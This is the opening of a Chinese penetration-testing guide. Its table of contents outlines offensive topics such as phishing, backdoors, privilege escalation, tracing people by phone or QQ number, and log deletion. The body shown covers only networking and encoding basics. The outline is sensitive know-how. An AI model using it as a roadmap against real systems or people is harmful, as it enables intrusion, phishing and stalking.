
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515191227460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
- [写在前面](#写在前面)
- [常见知识点](#常见知识点)
  - [密码学和编码](#密码学和编码)
      - [分辨是什么类型的](#分辨是什么类型的)
      - [工具介绍](#工具介绍)
    - [端口](#端口)
      - [常见端口](#常见端口)
  - [计算机基础](#计算机基础)
    - [术语](#术语)
      - [OSI七层协议](#osi七层协议)
      - [UDP与TCP](#udp与tcp)
      - [三次握手与四次挥手](#三次握手与四次挥手)
      - [协议](#协议)
        - [邮件协议族](#邮件协议族)
        - [邮件安全协议](#邮件安全协议)
    - [HTTP/HTTPS基础知识](#httphttps基础知识)
      - [http与https区别](#http与https区别)
      - [状态码](#状态码)
      - [cookie](#cookie)
        - [cookie会话验证和token验证区别以及安全问题](#cookie会话验证和token验证区别以及安全问题)
        - [http中的cookie参数包含什么](#http中的cookie参数包含什么)
      - [http协议版本](#http协议版本)
      - [代理](#代理)
      - [DNS](#dns)
      - [静态与动态](#静态与动态)
      - [访问类型](#访问类型)
      - [状态码](#状态码-1)
    - [编程语言](#编程语言)
      - [思想](#思想)
        - [MVC](#mvc)
    - [数据库](#数据库)
      - [关系型](#关系型)
        - [关系型数据库代表](#关系型数据库代表)
          - [mysql](#mysql)
          - [access](#access)
          - [mysql](#mysql-1)
      - [非关系型](#非关系型)
    - [Linux](#linux)
        - [权限划分](#权限划分)
        - [安装软件](#安装软件)
        - [重要目录](#重要目录)
      - [常见有用命令](#常见有用命令)
    - [windows](#windows)
      - [powshell](#powshell)
  - [常见文件含义](#常见文件含义)
- [信息收集](#信息收集)
  - [信息搜集开源项目](#信息搜集开源项目)
  - [web组成框架信息收集](#web组成框架信息收集)
    - [中间件](#中间件)
    - [源码层面收集](#源码层面收集)
      - [github](#github)
  - [特殊信息](#特殊信息)
    - [公司资产](#公司资产)
      - [特殊文件](#特殊文件)
      - [网站附属产品](#网站附属产品)
    - [拓展信息收集](#拓展信息收集)
      - [子域名收集](#子域名收集)
        - [相似域名](#相似域名)
        - [方法一：爆破子域名](#方法一爆破子域名)
        - [方法二：旁站搜集发现子域名](#方法二旁站搜集发现子域名)
        - [方法三：证书发现子域名](#方法三证书发现子域名)
        - [方法四：图标发现子域名](#方法四图标发现子域名)
        - [方法五：搜索引擎子域名](#方法五搜索引擎子域名)
        - [方法六：DNS发现子域名](#方法六dns发现子域名)
        - [方法七：其他方法发现子域名](#方法七其他方法发现子域名)
      - [目录爆破/敏感文件爆破](#目录爆破敏感文件爆破)
        - [工具](#工具)
        - [目录爆破经验](#目录爆破经验)
        - [图像](#图像)
        - [阻塞遍历序列](#阻塞遍历序列)
  - [钓鱼](#钓鱼)
  - [监控](#监控)
  - [内部信息搜集](#内部信息搜集)
- [工具](#工具-1)
    - [虚拟机](#虚拟机)
  - [学会上网](#学会上网)
    - [学会用普通搜索引擎](#学会用普通搜索引擎)
    - [暗网](#暗网)
    - [google hack](#google-hack)
    - [空间搜索引擎](#空间搜索引擎)
      - [Shodan](#shodan)
      - [censys搜索引擎](#censys搜索引擎)
      - [钟馗之眼](#钟馗之眼)
      - [FoFa搜索引擎](#fofa搜索引擎)
      - [Dnsdb搜索引擎](#dnsdb搜索引擎)
  - [DNS信息收集](#dns信息收集)
    - [dig](#dig)
    - [nslookup](#nslookup)
    - [hash相关工具](#hash相关工具)
      - [识别](#识别)
      - [破解](#破解)
        - [john](#john)
        - [hashcat](#hashcat)
    - [邮箱信息](#邮箱信息)
      - [搜集](#搜集)
      - [验证是否被弃用](#验证是否被弃用)
      - [验证邮箱是否泄露了密码](#验证邮箱是否泄露了密码)
  - [综合工具](#综合工具)
    - [信息搜集](#信息搜集)
      - [电子邮件](#电子邮件)
        - [Swaks](#swaks)
      - [发现电子邮件](#发现电子邮件)
      - [sparta](#sparta)
    - [扫描端口](#扫描端口)
      - [nmap](#nmap)
      - [nbtscan](#nbtscan)
      - [masscan](#masscan)
    - [抓包工具](#抓包工具)
    - [进程装包](#进程装包)
      - [Wireshark](#wireshark)
      - [Burpsuite](#burpsuite)
        - [使用前准备](#使用前准备)
    - [通用漏洞扫描工具](#通用漏洞扫描工具)
      - [主机扫描](#主机扫描)
      - [网站扫描](#网站扫描)
    - [Cobaltstrike](#cobaltstrike)
    - [kali](#kali)
      - [安装kali](#安装kali)
      - [扫描目标网站](#扫描目标网站)
  - [社会工程](#社会工程)
  - [后门](#后门)
    - [msfvenom](#msfvenom)
      - [Cobalt Strike](#cobalt-strike)
  - [待补充：购物建议](#待补充购物建议)
    - [硬件](#硬件)
    - [服务器](#服务器)
    - [代理](#代理-1)
      - [国内](#国内)
      - [国外](#国外)
  - [你常用的](#你常用的)
    - [匿名工具](#匿名工具)
    - [开放漏洞情报](#开放漏洞情报)
    - [寻找EXP](#寻找exp)
- [web安全](#web安全)
  - [中间人攻击](#中间人攻击)
    - [HTTPS](#https)
      - [CA证书欺骗](#ca证书欺骗)
      - [SSL劫持](#ssl劫持)
      - [防御](#防御)
  - [反序列化（对象注入）](#反序列化对象注入)
    - [PHP序列化与反序列化](#php序列化与反序列化)
      - [无类](#无类)
      - [有类](#有类)
    - [JAVA序列化与反序列化](#java序列化与反序列化)
      - [序列化函数介绍](#序列化函数介绍)
      - [工具](#工具-2)
    - [常见反序列化爆出漏洞](#常见反序列化爆出漏洞)
  - [文件操作](#文件操作)
    - [文件读取](#文件读取)
    - [文件包含](#文件包含)
      - [本地文件包含](#本地文件包含)
      - [远程协议包含](#远程协议包含)
      - [何种协议流玩法](#何种协议流玩法)
      - [防御](#防御-1)
    - [文件下载](#文件下载)
    - [文件上传漏洞](#文件上传漏洞)
      - [利用](#利用)
        - [+解析漏洞](#解析漏洞)
        - [+文件包含漏洞](#文件包含漏洞)
      - [逻辑漏洞](#逻辑漏洞)
        - [常规上传](#常规上传)
    - [文件删除](#文件删除)
  - [CORS](#cors)
  - [业务层面漏洞](#业务层面漏洞)
    - [模块](#模块)
    - [方式](#方式)
      - [无限制回退](#无限制回退)
      - [未授权访问](#未授权访问)
      - [竞态](#竞态)
      - [越权](#越权)
        - [越权测试](#越权测试)
        - [防御](#防御-2)
  - [开放性](#开放性)
  - [登录脆弱](#登录脆弱)
    - [漏洞类型](#漏洞类型)
    - [验证脆弱](#验证脆弱)
      - [开发者不严谨](#开发者不严谨)
        - [验证码破解](#验证码破解)
          - [弱验证码绕过](#弱验证码绕过)
          - [识别绕过](#识别绕过)
      - [登陆点暴力破解](#登陆点暴力破解)
        - [社工字典](#社工字典)
      - [常见攻击方法](#常见攻击方法)
        - [暴力破解](#暴力破解)
        - [密码喷洒攻击](#密码喷洒攻击)
        - [获得登录凭证的下一步](#获得登录凭证的下一步)
      - [防御与绕过方法](#防御与绕过方法)
        - [待补充：AI破解](#待补充ai破解)
        - [绕过双因素验证](#绕过双因素验证)
  - [XML 外部实体 (XXE) 注入](#xml-外部实体-xxe-注入)
    - [背景：什么是XML？](#背景什么是xml)
    - [什么是 XML 外部实体注入？](#什么是-xml-外部实体注入)
    - [XXE 漏洞怎么验证？](#xxe-漏洞怎么验证)
    - [XXE 攻击有哪些类型？](#xxe-攻击有哪些类型)
      - [利用XXE检索文件](#利用xxe检索文件)
      - [利用XXE进行SSRF攻击？](#利用xxe进行ssrf攻击)
      - [XXE 亿笑攻击-DOS](#xxe-亿笑攻击-dos)
    - [寻找 XXE 注入的隐藏攻击面](#寻找-xxe-注入的隐藏攻击面)
      - [前端数据没有定义DOCTYPE](#前端数据没有定义doctype)
      - [允许上传特定文件，无xml在前端回显](#允许上传特定文件无xml在前端回显)
      - [通过修改内容类型进行 XXE 攻击](#通过修改内容类型进行-xxe-攻击)
    - [如何查找和测试 XXE 漏洞](#如何查找和测试-xxe-漏洞)
      - [自动化工具](#自动化工具)
      - [手动测试](#手动测试)
    - [XXE防御方案](#xxe防御方案)
  - [点击劫持（Clickjacking）](#点击劫持clickjacking)
    - [什么是点击劫持？](#什么是点击劫持)
    - [点击劫持](#点击劫持)
  - [远程命令执行（RCE）](#远程命令执行rce)
    - [实例：网站可执行系统命令](#实例网站可执行系统命令)
  - [SQL注入](#sql注入)
    - [手工注入](#手工注入)
      - [常规注入](#常规注入)
        - [变种分析](#变种分析)
      - [盲注](#盲注)
    - [制造回显](#制造回显)
      - [报错回显](#报错回显)
        - [bool类型注入](#bool类型注入)
          - [制作布尔查询](#制作布尔查询)
        - [时间SQL注入](#时间sql注入)
          - [制作时间SQL注入](#制作时间sql注入)
          - [其他数据库的时间注入](#其他数据库的时间注入)
    - [sql注入过程：sqlmap](#sql注入过程sqlmap)
      - [tamper 自定义](#tamper-自定义)
    - [跨域连接](#跨域连接)
    - [SQL注入常见防御](#sql注入常见防御)
    - [绕过防御](#绕过防御)
      - [静态资源](#静态资源)
      - [爬虫白名单](#爬虫白名单)
      - [版本绕过](#版本绕过)
      - [空白](#空白)
      - [空字节](#空字节)
      - [网址编码](#网址编码)
      - [十六进制编码（HEX）](#十六进制编码hex)
      - [字符编码](#字符编码)
      - [字符串连接](#字符串连接)
      - [注释](#注释)
      - [组合](#组合)
      - [二次注入](#二次注入)
    - [注入拓展](#注入拓展)
      - [dnslog带外注入](#dnslog带外注入)
      - [json格式数据包](#json格式数据包)
      - [insert 注入](#insert-注入)
      - [加密参数](#加密参数)
      - [堆叠查询注入](#堆叠查询注入)
      - [cookie 注入](#cookie-注入)
  - [网页缓存攻击](#网页缓存攻击)
    - [什么是网页缓存中毒？](#什么是网页缓存中毒)
    - [Web 缓存中毒攻击的影响是什么？](#web-缓存中毒攻击的影响是什么)
    - [构建网络缓存中毒攻击](#构建网络缓存中毒攻击)
      - [从后端服务器引出有害响应](#从后端服务器引出有害响应)
      - [获取缓存的响应](#获取缓存的响应)
      - [如何防止网页缓存中毒漏洞](#如何防止网页缓存中毒漏洞)
  - [身份验证漏洞](#身份验证漏洞)
    - [身份验证漏洞是如何产生的？](#身份验证漏洞是如何产生的)
    - [基于密码登录的漏洞](#基于密码登录的漏洞)
      - [暴力攻击](#暴力攻击)
        - [暴力破解用户名](#暴力破解用户名)
        - [暴力破解密码](#暴力破解密码)
        - [用户名枚举](#用户名枚举)
    - [有缺陷的蛮力保护](#有缺陷的蛮力保护)
        - [IP封锁](#ip封锁)
        - [账户锁定](#账户锁定)
        - [用户限速](#用户限速)
    - [多因素身份验证中的漏洞](#多因素身份验证中的漏洞)
      - [绕过两步验证](#绕过两步验证)
  - [基于 DOM 的漏洞](#基于-dom-的漏洞)
    - [什么是DOM？](#什么是dom)
    - [污点流漏洞](#污点流漏洞)
    - [如何防止基于 DOM 的污点流漏洞](#如何防止基于-dom-的污点流漏洞)
    - [DOM 破坏](#dom-破坏)
  - [HTTP 主机头攻击](#http-主机头攻击)
    - [什么是 HTTP 主机标头？](#什么是-http-主机标头)
    - [HTTP Host 标头的目的是什么？](#http-host-标头的目的是什么)
      - [虚拟主机](#虚拟主机)
      - [通过中介路由流量](#通过中介路由流量)
      - [HTTP Host 头是如何解决这个问题的？](#http-host-头是如何解决这个问题的)
    - [什么是 HTTP 主机标头攻击？](#什么是-http-主机标头攻击)
    - [HTTP 主机头漏洞是如何产生的？](#http-主机头漏洞是如何产生的)
    - [如何验证http主机头漏洞？](#如何验证http主机头漏洞)
    - [如何利用http主机头漏洞？](#如何利用http主机头漏洞)
    - [如何防止HTTP Host头攻击](#如何防止http-host头攻击)
  - [跨站脚本（xss）](#跨站脚本xss)
    - [什么是xss](#什么是xss)
    - [XSS 攻击有哪些类型？](#xss-攻击有哪些类型)
      - [DOM型XSS](#dom型xss)
    - [XSS 可以用来做什么？](#xss-可以用来做什么)
    - [XSS 漏洞的影响](#xss-漏洞的影响)
    - [XSS 漏洞验证](#xss-漏洞验证)
    - [手动XSS验证语句思路](#手动xss验证语句思路)
      - [快速XSS验证](#快速xss验证)
        - [burpsuite的XSS清单](#burpsuite的xss清单)
        - [XSStrike](#xsstrike)
        - [xss的fuzz字段](#xss的fuzz字段)
      - [XSS常出现位置](#xss常出现位置)
    - [XSS漏洞利用](#xss漏洞利用)
      - [窃取 cookie](#窃取-cookie)
      - [xss平台](#xss平台)
      - [beef-xss](#beef-xss)
    - [XSS防御](#xss防御)
    - [关于XSS的常见问题](#关于xss的常见问题)
    - [XSS学习资源](#xss学习资源)
  - [跨站请求伪造 (CSRF）](#跨站请求伪造-csrf)
    - [什么是CSRF？](#什么是csrf)
    - [CSRF 攻击的影响是什么？](#csrf-攻击的影响是什么)
    - [CSRF 攻击前提是什么？](#csrf-攻击前提是什么)
    - [如何构建CSRF攻击？](#如何构建csrf攻击)
    - [CSRF 防御方式有哪些？](#csrf-防御方式有哪些)
    - [CSRF 反防御方式有哪些？](#csrf-反防御方式有哪些)
  - [模板注入](#模板注入)
  - [SSRF](#ssrf)
    - [常见攻击](#常见攻击)
      - [图片上传](#图片上传)
  - [DDOS 攻击](#ddos-攻击)
    - [DDOS 攻击手段](#ddos-攻击手段)
  - [待补充：劫持漏洞](#待补充劫持漏洞)
    - [DNS劫持](#dns劫持)
    - [HTTP劫持](#http劫持)
    - [DLL劫持](#dll劫持)
  - [攻击漏洞技巧](#攻击漏洞技巧)
    - [CRLF 注入](#crlf-注入)
    - [宽字节注入](#宽字节注入)
- [绕过检测](#绕过检测)
  - [待补充：免杀](#待补充免杀)
  - [WAF绕过](#waf绕过)
- [经验积累](#经验积累)
  - [漏洞出现在？](#漏洞出现在)
    - [URL参数](#url参数)
      - [经验](#经验)
      - [出现在：参数可渲染](#出现在参数可渲染)
      - [+http参数污染](#http参数污染)
      - [+CRLF](#crlf)
      - [+xss](#xss)
      - [+开放重定向](#开放重定向)
    - [嵌入网站元素](#嵌入网站元素)
      - [+xss](#xss-1)
    - [数据包参数](#数据包参数)
      - [置空](#置空)
      - [修改信号](#修改信号)
    - [重复发包](#重复发包)
    - [文件上传](#文件上传)
      - [+xxe](#xxe)
  - [中间件](#中间件-1)
    - [IIS](#iis)
    - [JAVAWEB](#javaweb)
    - [Apache](#apache)
    - [Nginx](#nginx)
    - [Shiro](#shiro)
    - [tomcat](#tomcat)
    - [struct2](#struct2)
  - [组件](#组件)
    - [敏感信息搜集](#敏感信息搜集)
    - [工具](#工具-3)
      - [利用](#利用-1)
      - [弱口令](#弱口令)
    - [thinkphp5](#thinkphp5)
      - [特性](#特性)
      - [历史漏洞](#历史漏洞)
    - [dedecms](#dedecms)
      - [基本信息](#基本信息)
      - [敏感信息](#敏感信息)
  - [语言特性](#语言特性)
    - [PHP](#php)
      - [变量覆盖漏洞](#变量覆盖漏洞)
    - [JAVAWEB](#javaweb-1)
  - [蜜罐](#蜜罐)
  - [Webshell](#webshell)
- [系统漏洞](#系统漏洞)
  - [工具](#工具-4)
    - [探测工具简介](#探测工具简介)
    - [EXP工具](#exp工具)
        - [Metasploit](#metasploit)
  - [字典](#字典)
    - [制作](#制作)
    - [fuzzy](#fuzzy)
- [API漏洞](#api漏洞)
- [微信小程序漏洞](#微信小程序漏洞)
- [PC端软件](#pc端软件)
- [APP漏洞](#app漏洞)
  - [抓包](#抓包)
- [待补充：应急响应](#待补充应急响应)
- [社会工程学](#社会工程学)
  - [以假乱真](#以假乱真)
    - [准备](#准备)
      - [1. 购买相似域名](#1-购买相似域名)
        - [购买谁家强](#购买谁家强)
        - [买什么域名](#买什么域名)
          - [常见混淆方法](#常见混淆方法)
          - [购买SEO高的域名](#购买seo高的域名)
          - [其他购买技巧](#其他购买技巧)
          - [自动工具](#自动工具)
      - [2. 收集邮箱](#2-收集邮箱)
      - [3. 邮件内容](#3-邮件内容)
        - [主题](#主题)
        - [结尾](#结尾)
        - [伪造网站](#伪造网站)
    - [站点伪造](#站点伪造)
    - [who am i](#who-am-i)
  - [钓鱼](#钓鱼-1)
    - [工具](#工具-5)
      - [gophish](#gophish)
    - [钓鱼手段](#钓鱼手段)
      - [链接存放在](#链接存放在)
        - [+开放重定向](#开放重定向-1)
      - [宏 – Office](#宏--office)
      - [非宏的 Office 文件 —— DDE](#非宏的-office-文件--dde)
      - [隐藏的加密 payload](#隐藏的加密-payload)
      - [钓鱼 wifi](#钓鱼-wifi)
    - [定向社工](#定向社工)
  - [如何在本地查询](#如何在本地查询)
- [经验](#经验-1)
  - [知名网站](#知名网站)
  - [IP伪造](#ip伪造)
    - [攻破类似网站](#攻破类似网站)
      - [如何攻击更多人](#如何攻击更多人)
    - [溯源](#溯源)
      - [很强大的溯源工具](#很强大的溯源工具)
      - [已知名字](#已知名字)
      - [已知邮箱](#已知邮箱)
        - [获取电话号码](#获取电话号码)
      - [IP 定位](#ip-定位)
      - [已知电话号码](#已知电话号码)
        - [查询社交账号](#查询社交账号)
      - [社交账号](#社交账号)
        - [查询照片EXIF](#查询照片exif)
      - [已知QQ号](#已知qq号)
        - [查询地址](#查询地址)
        - [查询电话号](#查询电话号)
        - [加被害者](#加被害者)
      - [社工库](#社工库)
  - [绕过CDN](#绕过cdn)
- [内网渗透](#内网渗透)
  - [基础](#基础)
    - [信息搜集](#信息搜集-1)
    - [获取明文密码](#获取明文密码)
      - [windows 2012](#windows-2012)
      - [windows10](#windows10)
      - [Mac](#mac)
      - [Linux](#linux-1)
        - [脏牛提权](#脏牛提权)
        - [SUID提权](#suid提权)
        - [SUDO提权](#sudo提权)
        - [LINUX配置错误提权](#linux配置错误提权)
        - [定时任务提权](#定时任务提权)
        - [密码复用提权](#密码复用提权)
        - [第三方服务提权](#第三方服务提权)
- [横向渗透](#横向渗透)
      - [传递爆破其他账户密码](#传递爆破其他账户密码)
      - [控制方法1：定时任务放后门](#控制方法1定时任务放后门)
      - [控制方法2：建立连接](#控制方法2建立连接)
    - [SPN](#spn)
  - [linux渗透](#linux渗透)
    - [信息搜集](#信息搜集-2)
- [杂项](#杂项)
  - [获取数据库账号密码](#获取数据库账号密码)
    - [mysql](#mysql-2)
      - [获取基本信息](#获取基本信息)
      - [获取root账号密码](#获取root账号密码)
      - [Oracle](#oracle)
    - [MssQL](#mssql)
    - [Redis](#redis)
      - [PostgreSQL](#postgresql)
  - [提权](#提权)
    - [提权准备](#提权准备)
    - [window提权](#window提权)
      - [提权方法](#提权方法)
        - [系统内核溢出漏洞提权](#系统内核溢出漏洞提权)
      - [win2003](#win2003)
      - [win7](#win7)
      - [win2008](#win2008)
      - [Windows2008&7令牌窃取提升-本地](#windows20087令牌窃取提升-本地)
      - [不安全的服务权限配合MSF-本地权限](#不安全的服务权限配合msf-本地权限)
        - [攻击过程](#攻击过程)
      - [win2012不带引号服务路径配合MSF-Web,本地权限](#win2012不带引号服务路径配合msf-web本地权限)
        - [攻击过程](#攻击过程-1)
      - [win2012DLL劫持提权应用配合MSF-Web权限](#win2012dll劫持提权应用配合msf-web权限)
      - [Win2012烂土豆提权](#win2012烂土豆提权)
        - [提权原理](#提权原理)
        - [提权过程](#提权过程)
    - [LINUX提权](#linux提权)
      - [提权准备](#提权准备-1)
      - [SUID配置错误漏洞](#suid配置错误漏洞)
      - [压缩通配符](#压缩通配符)
      - [定时任务执行权限分配过高](#定时任务执行权限分配过高)
    - [数据库提权](#数据库提权)
      - [Mysql](#mysql-3)
        - [UDF](#udf)
        - [MOF](#mof)
        - [启动项知识点:(基于配合操作系统自启动)](#启动项知识点基于配合操作系统自启动)
        - [反弹知识点:(基于利用反弹特性命令执0行)](#反弹知识点基于利用反弹特性命令执0行)
      - [Oracle提权演示](#oracle提权演示)
      - [MssQL](#mssql-1)
        - [使用xp_emdshell进行提权](#使用xp_emdshell进行提权)
        - [SQL sever 沙盒提权](#sql-sever-沙盒提权)
      - [Redis](#redis-1)
        - [Redis数据库权限提升](#redis数据库权限提升)
      - [PostgreSQL](#postgresql-1)
- [代码审计](#代码审计)
  - [phpweb](#phpweb)
    - [一键审计](#一键审计)
    - [数据库监控](#数据库监控)
    - [常规代码审计](#常规代码审计)
  - [JAVAWEB](#javaweb-2)
    - [开发基础](#开发基础)
      - [Spring](#spring)
        - [基础介绍](#基础介绍)
        - [核心知识点](#核心知识点)
      - [Spring MVC](#spring-mvc)
      - [MyBatis](#mybatis)
    - [开发基础](#开发基础-1)
    - [基础开发知识](#基础开发知识)
    - [审计](#审计)
        - [常见审计知识点](#常见审计知识点)
        - [寻找可控输入](#寻找可控输入)
        - [过滤敏感字符方案](#过滤敏感字符方案)
      - [SQL注入](#sql注入-1)
        - [防御](#防御-3)
      - [手动](#手动)
      - [工具](#工具-6)
- [待补充：物理攻击](#待补充物理攻击)
  - [wifi](#wifi)
  - [ID卡](#id卡)
- [待补充：隐藏技术](#待补充隐藏技术)
  - [实用工具](#实用工具)
    - [日志删除](#日志删除)
@[toc]

# 写在前面

**作者：北丐**

**qq交流群：942443861**

文章链接：https://github.com/ngadminq/Bei-Gai-penetration-test-guide


本文开始于2021/4/27
预计2022年完成


很抱歉，这篇文章你看到的时候还是粗糙的，文章更改可能出现在各个章节，文章**每周五更一次版本。**
在github显示与排版效果似乎不好，可以下载[typora](https://typora.io/)与md文件，将md用typora打开，可以看到目录树。如下图是软件打开效果。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720144245627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
哈哈哈，对了发现一个问题，因为文章文本含有不少漏洞后门代码，这可能导致你的查杀软件当做异常。不过不用担心我是不是有恶意，因为我不会伤害我的任何一位读者。善用crtl+F，对关键字进行快速定位。学习时可自行按照自己喜欢的顺序，并不一定要严格按照我的文章目录。
另外请记得同步我的最新文章，它总是比上一个版本更好。


我热爱分享，文章可能有的部分对于你有帮助有的没有，选来用。请善待我的努力和分享精神。如果你觉得文章对你有帮助记得star，或者在你的技术分享文章中引用我的文章链接

# 常见知识点

只介绍常见和必备基础不涉及到深度，并且里面穿插一些与安全相关的知识点




## 密码学和编码

**常用加密方式**
对于网站常用base64对url中id进行加密
对于数据库密码常用md5加密
现在大多数网站内容为防止攻击，在前端采用AES/AES+RSA加密,所以你收到的返回的响应包是加密的，通用漏洞扫描工具对此更难解析

**对称加密与非对称**
对称加密是最快速、最简单的一种加密方式，加密与解密用的是同样的密钥。常见的对称加密算法：DES，AES等。
非对称加密为数据的加密与解密提供了一个非常安全的方法，它使用了一对密钥，公钥和私钥。私钥只能由一方安全保管，不能外泄，而公钥则可以发给任何请求它的人。非对称加密使用这对密钥中的一个进行加密，而解密则需要另一个密钥。最常用的非对称加密算法：RSA

#### 分辨是什么类型的

互联网只接受 ASCII 格式的 URL，URL 编码需要对 URL 字符集的某些部分进行编码。此过程将一个字符转换为一个字符三元组，其前缀为“%”，后跟两个十六进制格式的数字。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628204319808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628210715235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
md5:任意长度的数据，算出的MD5值长度都是固定的，一般是32位也有16位。由数字大小写混成。密文中字母大小写不会影响破解结果

如何分辨base64
长度一定会被4整除
很多都以等号结尾(为了凑齐所以结尾用等号)，当然也存在没有等号的base64
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628205659976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
除了base64你可能还会遇到base32,base16
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714140947269.png)


**AES**
AES最重要的是在base64基础上增加了两个参数即：密码和偏移；现在很多CTF也会有AES编码的题的，但都是给了这两个参数的值，不给的话神仙也解不出来
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628212205816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

HEX编码
HEX编码又叫十六进制编码，是数据的16进制表达形式，是计算机中数据的一种表示方法。同我们日常中的十进制表示法不一样。它由0-9，A-F组成。与10进制的对应关系是：0-9对应0-9，A-F对应10-15。同样以“https://mp.toutiao.com”头条号主页地址为例，经过HEX编码后结果如下图所示：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210521203017826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


密钥：如果加密密钥和解密密钥相同，那么这种密码算法叫做对称密码算法，这个比较好理解，符合正常的逻辑，一把钥匙对一把锁嘛；另外一类，正好相反，也就是加密密钥和解密密钥不相同，这种密码算法叫做非对称密码算法，也叫公钥密码算法，




#### 工具介绍

加密工具
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628202608911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
解密工具
一些网站研究出了算法来允许破解md5比如cmd5，你获取到如下数据库密码时，你可以注意到这个密码还采用了salt加盐，因此你在使用cmd5时应注意调参
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628225351540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 端口

范围：0-65535
固定端口：0-1023 1024保留
动态端口：1024-65535

#### 常见端口

**常见端口**
http:80
https:443
ftp:20/21

**危险端口**
SMB：445	永恒之蓝

**数据库端口**
mysql：3306
oracle：1521
postgrsql：5432
derby：1527
SQL Server：1433
DB2：50000
sybase：5000
mongoDB：27017
Redis:6379


## 计算机基础

### 术语

 **同源策略**

先解释一下同源：协议、域名、端口都一样就是同源
 ~ http、https、 
 ~ a.com、b.com
 ~ url:80、url:90

 只有Js脚本和Html模块（即网页的前端数据）必须在同一个源下，Js脚本才能读取或处理Html模块。同源策略能保护了自己域名的信息，即自己的html不能被外域名的Js脚本读取

**CDN**
 cdn全称是内容分发网络。其目的是让用户能够更快速的得到请求的数据。简单来讲，cdn就是用来加速的，他能让用户就近访问数据，这样就更更快的获取到需要的数据。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了。


#### OSI七层协议

**物理层**
传输对象：比特流
作用：从数据链路层接收帧，将比特流转换成底层物理介质上的信号
**数据链路层**
传输对象：帧
作用：在网络层实体间提供数据传输功能和控制
**网络层**
作用：负责端到端的数据的路由或交换，为透明地传输数据建立连接
**传输层**
作用：接收来自会话层的数据，如果需要，将数据分割成更小的分组，向网络层传送分组并确保分组完整和正确到达它们的目的地
**会话层**
作用：提供提供节点之间通信过程的协调
**表示层**
传输对象：针对不同应用软件的编码格式
作用：提供数据格式、变换和编码转换
**应用层**
传输对象：各种应用如电子邮件、文件传输等

#### UDP与TCP

协议开销小、效率高。
UDP是无连接的，即发送数据之前不需要建立连接。


TCP提供了一种可靠、面向连接、字节流、传输层的服务，采用三次握手建立一个连接。采用4次挥手来关闭一个连接。

#### 三次握手与四次挥手

ACK报文是用来应答的，SYN报文是用来同步的

****

当连接建立时，有：

客户端 ------SYN----> 服务器

客户端 <---ACK+SYN---- 服务器

客户端 ------ACK----> 服务器

****

当终止到来时，有：

客户端------FIN---->服务器

客户端 <-----ACK------ 服务器 

客户端 <-----FIN------ 服务器 

客户端 ------ACK----> 服务器

#### 	协议

**ICMP**
icmp是Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。
**DHCP**
动态主机配置协议 (Dynamic Host Configuration Protocol，DHCP) 是一个用于局域网的网络协议，位于OSI模型的应用层，使用UDP协议工作，主要用于自动分配IP地址给用户，方便管理员进行统一管理。
![在这里插入图片描述](https://img-blog.csdnimg.cn/cbb0a34b02bf4711919c5b4da792d23b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)





##### 邮件协议族

 **SMTP**
SMTP (Simple Mail Transfer Protocol) 是一种电子邮件传输的协议，是一组用于从源地址到目的地址传输邮件的规范。不启用SSL时端口号为25，启用SSL时端口号多为465或994。

以HTTP协议举例，HTTP协议中有状态码的概念，用于表示当前请求与响应的状态，通过状态码可以定位可能的问题所在，SMTP与HTTP非常相似，都是明文协议。早期SMTP协议的开发初衷是为了解决一个大学中实验室成员进行通信、留言的问题，但随着互联网的发展，SMTP的应用越来越广泛。
在SMTP协议中，也有状态码的概念，与HTTP协议相同，250表示邮件传送成功。整个SMTP报文分为两类：
信封
信的内容
